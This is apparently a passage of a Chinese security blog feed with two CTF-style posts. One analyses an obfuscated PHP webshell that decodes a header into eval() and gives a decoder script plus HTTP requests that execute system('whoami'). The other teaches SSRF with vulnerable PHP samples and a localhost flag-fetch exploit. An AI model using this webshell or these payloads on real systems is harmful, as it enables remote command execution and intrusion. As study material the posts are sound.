class="string">&quot;e&quot;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$c</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="literal">null</span>.<span class="variable">$e</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">new</span> <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">set_token</span>(<span class="variable">$v</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一共分了三步来执行<br>首先，这个函数定义了一个函数 set_token() 和一个类 class E，但我们不着急看，我们先看PHP先执行的部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//_SESSION 是用于在PHP中存储会话数据的关联数组，通常用于在不同页面之间共享数据。isset函数用于检查变量是否已经被设置，如果变量存在并且有值，返回 true，否则返回 false。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_TOKEN&quot;</span>])) &#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()),<span class="number">16</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Token:&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_CSRF_TOKEN&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;DQHNGW&#x27;</span>^<span class="string">&#x27;&amp;0;+qc&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>.= <span class="string">&#x27;_dec&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">111</span>).<span class="string">&#x27;de&#x27;</span>;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$b</span>(<span class="variable">$v</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以根据知识点，我们要先给服务器发一个 Token 值，这样就可以进入if语句，服务器就会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端</p><p>但 Token 只需要获取一次就行了，因为服务器生成并返还令牌（token）后，会存在会话（session）中，简单理解就是服务器的内存当中，后续的使用就不要添加Token 值了  </p><p><font color="red">因为如果再获取，令牌（token）又会重新生成，就无法进入else的后续步骤，</font> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_CSRF_TOKEN&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;DQHNGW&#x27;</span>^<span class="string">&#x27;&amp;0;+qc&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>.= <span class="string">&#x27;_dec&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">111</span>).<span class="string">&#x27;de&#x27;</span>;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$b</span>(<span class="variable">$v</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//异或和拼接赋值</span></span><br><span class="line"><span class="comment">//转化为</span></span><br><span class="line"><span class="variable">$v</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_CSRF_TOKEN&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;base64_decode&quot;</span>;</span><br><span class="line"><span class="variable">$v</span> = <span class="variable">$b</span>(<span class="variable">$v</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>意思就是，从HTTP请求头获取名为 “HTTP_X_CSRF_TOKEN” 的值，并进行Base64解密再讲值重新赋给 $v  </p><p>接下来我们再来看类 class E :  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$c</span>=(<span class="string">&#x27;ZSLQWR&#x27;</span>^<span class="string">&#x27;82?4af&#x27;</span>).<span class="string">&quot;_d&quot;</span>.<span class="string">&quot;eco&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">108</span>-<span class="number">8</span>).<span class="string">&quot;e&quot;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$c</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="literal">null</span>.<span class="variable">$e</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//同理</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$c</span> = <span class="string">&quot;base64_decode&quot;</span>;</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$c</span>(<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="literal">null</span>.<span class="variable">$e</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//意思就是类 class E 接受一个参数 $p，将其通过Base64解密后，放入高危函数 eval 内执行</span></span><br><span class="line"><span class="comment">//那我们想要成功执行命令，就必须控制 $p 的传入值</span></span><br><span class="line"></span><br><span class="line">@<span class="keyword">new</span> <span class="title function_ invoke__">E</span>(<span class="title function_ invoke__">set_token</span>(<span class="variable">$v</span>, <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="comment">//由此可知，$p 为 set_token($v, $_SESSION[&#x27;token&#x27;]) 的执行结果，所以我们要控制 set_token($v, $_SESSION[&#x27;token&#x27;]) 的内容才能成功执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$v</span> 参数：从HTTP请求头获取名为 “HTTP_X_CSRF_TOKEN” 的值，并进行Base64解密再讲值重新赋给 <span class="variable">$v</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] 参数：给服务器发一个 TOKEN 值，会生成一个随机的令牌（token）并将其存储在会话（session）中，并通过HTTP头部返回给客户端</span><br></pre></td></tr></table></figure><p>然后看set_token()：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$t</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>; <span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$x</span>+<span class="number">1</span>)%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$x</span>,<span class="variable">$x</span>+<span class="number">1</span>))^<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>,<span class="variable">$x</span>%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>),(<span class="variable">$x</span>+<span class="number">1</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>))));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$r</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$x</span>,<span class="variable">$x</span>+<span class="number">1</span>))^<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>,<span class="variable">$x</span>%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>),<span class="number">16</span>)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单来说，函数 set_token($v, $t) 就是一个加密算法，作用是根据输入的两个字符串 $v 和 $t，返回一个新的字符串 $r  </p><p>该函数采用异或（XOR）操作对两个字符串的每个字符进行逐一处理，并将结果拼接成新的字符串返回</p><p>而返回的 $r 变量，最终会传入 @new E($r)，进行Base64解密并放入高危函数 eval 内执行  </p><p>打个比方，假设我们想执行系统命令 whoami，那 $r 变量就应该是 system(‘whoami’); Base64加密后的字符串 c3lzdGVtKCd3aG9hbWknKTsg<br>而 $r 变量又是 set_token($v, $_SESSION[‘token’]) 的加密结果，看上去很清晰，那目前我们的困境是什么？</p><p>那就是我们不知道 $v 应该传什么值！！！我们目前只知道 $t&#x3D;&gt;$_SESSION[‘token’] 和执行的最终结果 $r&#x3D;&gt;c3lzdGVtKCd3aG9hbWknKTsg，那我们能不能通过这两个变量获得 $v呢，当然可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt_token</span>(<span class="params"><span class="variable">$r</span>, <span class="variable">$t</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$v</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$x</span> = <span class="number">0</span>; <span class="variable">$x</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$r</span>); <span class="variable">$x</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$x</span> + <span class="number">1</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$v</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$r</span>, <span class="variable">$x</span>, <span class="variable">$x</span> + <span class="number">1</span>)) ^ <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="variable">$x</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>), (<span class="variable">$x</span> + <span class="number">1</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>))));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$v</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$r</span>, <span class="variable">$x</span>, <span class="variable">$x</span> + <span class="number">1</span>)) ^ <span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>, <span class="variable">$x</span> % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>), <span class="number">16</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 已知的 $t 和 $r 的值</span></span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];  <span class="comment">//已知的 $t 的值</span></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;out&#x27;</span>];  <span class="comment">//&quot;c3lzdGVtKCd3aG9hbWknKTsg&quot; 已知的 $r 的值</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密已知的 $r 值得到 $v</span></span><br><span class="line"><span class="variable">$v</span> = <span class="title function_ invoke__">decrypt_token</span>(<span class="variable">$r</span>, <span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$v</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过编写这么一段代码，调换了一下顺序，就可以通过 $t&#x3D;&gt;$_SESSION[‘token’] 和 $r&#x3D;&gt;c3lzdGVtKCd3aG9hbWknKTsg，拿到参数 $v</p><h4 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h4><ol><li>第一步、密钥协商得到Token<br>对WebShell进行发包，Token 随便填啥都行</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /muma.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: test.ctf.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">83.0</span>.<span class="number">4103.116</span> Safari/<span class="number">537.36</span></span><br><span class="line">Token: <span class="number">1</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>返回包中可以看到服务器生成的 Token 值和 Cookie 值<br>2. 第二步，得到X-CSRF-TOKEN<br>假设我们想执行系统命令 whoami，PHP代码就是 system(‘whoami’); ，对其进行Base64加密后的字符串 c3lzdGVtKCd3aG9hbWknKTsg，当然你想执行其他的命令也行  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /decode.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: test.ctf.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">83.0</span>.<span class="number">4103.116</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">token=a2b3fca92539495e&amp;out=c3lzdGVtKCd3aG9hbWknKTsg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后通过上文写的解密PHP，通过第一步获得的 Token 值和最终Base64加密后的字符串 c3lzdGVtKCd3aG9hbWknKTsg，拿到得到 X-CSRF-TOKEN</p><p><font color="red">这不是对WebShell发包，而是对上面写的解密PHP decode.php 来进行解密</font>  </p><ol start="3"><li>第三步，利用木马成功执行命令<br>现在已经拿到 X-CSRF-TOKEN 和 Cookie 了，那就直接发包即可  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /muma.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: test.ctf.com</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">83.0</span>.<span class="number">4103.116</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=<span class="number">6</span>g4sgte2t8nnv65u8er5cfdtnq;</span><br><span class="line">X-CSRF-TOKEN: AgEOSQIkN015dlcKVX4MDQNlCV0tNxJe</span><br><span class="line">Content-Length: <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf学习</title>
      <link href="/2024/11/14/ssrf%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/11/14/ssrf%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ssrf学习"><a href="#ssrf学习" class="headerlink" title="ssrf学习"></a>ssrf学习</h1><h2 id="ssrf漏洞原理："><a href="#ssrf漏洞原理：" class="headerlink" title="ssrf漏洞原理："></a>ssrf漏洞原理：</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p></blockquote><p>ssrf攻击对象一般是外网不通的服务器，而造成这一漏洞的原因大都是因为被攻击的服务器<font color="red">提供了与其他服务器交互数据的功能。</font></p><p>且对目标的地址没有过滤和限制（或可以绕过</p><p><img src="/img/ssrf.png" alt="ssrf"></p><p>黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用<font color="red">存在缺陷的web应用作为代理攻击远程和本地的服务器</font></p><h2 id="ssrf漏洞场景："><a href="#ssrf漏洞场景：" class="headerlink" title="ssrf漏洞场景："></a>ssrf漏洞场景：</h2><blockquote><p>场景:</p><ol><li>分享：通过URL地址分享网页内容  </li><li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译:通过URL地址翻译对应文本的内容。</li><li>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示<blockquote><p><a href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a><br>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p></blockquote></li><li>未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</li><li>图片加载与下载(当然img标签就行了，但不排除一些开发者对图片进行水印调整或压缩等操作便会造成ssrf)</li><li>从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞<blockquote><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p></blockquote></li></ol></blockquote><h2 id="ssrf漏洞函数（任何语言都可能，以PHP为例）"><a href="#ssrf漏洞函数（任何语言都可能，以PHP为例）" class="headerlink" title="ssrf漏洞函数（任何语言都可能，以PHP为例）"></a>ssrf漏洞函数（任何语言都可能，以PHP为例）</h2><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1. file_get_contents():"></a>1. file_get_contents():</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-fsockopen"><a href="#2-fsockopen" class="headerlink" title="2. fsockopen():"></a>2. fsockopen():</h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例题：[HNCTF 2022 WEEK2]ez_ssrf<br>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>一个简单的不设防的套接字（socket）建立起的两个程序之间的通信连接，根据提示，构造exp：<br>（GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Keep-Alive先base）  </p><p>&#x2F;?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p><h3 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3. curl_exec():"></a>3. curl_exec():</h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 